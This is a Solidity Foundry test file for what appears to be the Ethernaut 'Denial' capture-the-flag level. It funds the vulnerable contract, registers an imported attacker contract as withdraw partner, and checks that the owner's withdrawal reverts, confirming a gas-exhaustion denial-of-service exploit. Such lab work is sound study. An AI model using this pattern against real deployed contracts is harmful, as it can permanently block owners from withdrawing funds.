// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/20_Denial.sol";
import "contracts/20_Denial.sol";

contract AttackerDenialTest is Test {
    using SafeMath for uint256;
    address _owner = address(0xA9E);
    address _hacker = makeAddr("hacker");

    function testDenial() external {
        vm.prank(_owner);
        Denial denial = new Denial();
        AttackerDenial attackerDenial = new AttackerDenial();

        (bool success, ) = address(denial).call{value: 10 ether}("");
        require(success, "Transfer failed!");
        assertEq(address(denial).balance, 10 ether);

        denial.setWithdrawPartner(address(attackerDenial));

        vm.expectRevert();
        denial.withdraw{gas: 1000000}();
    }
}
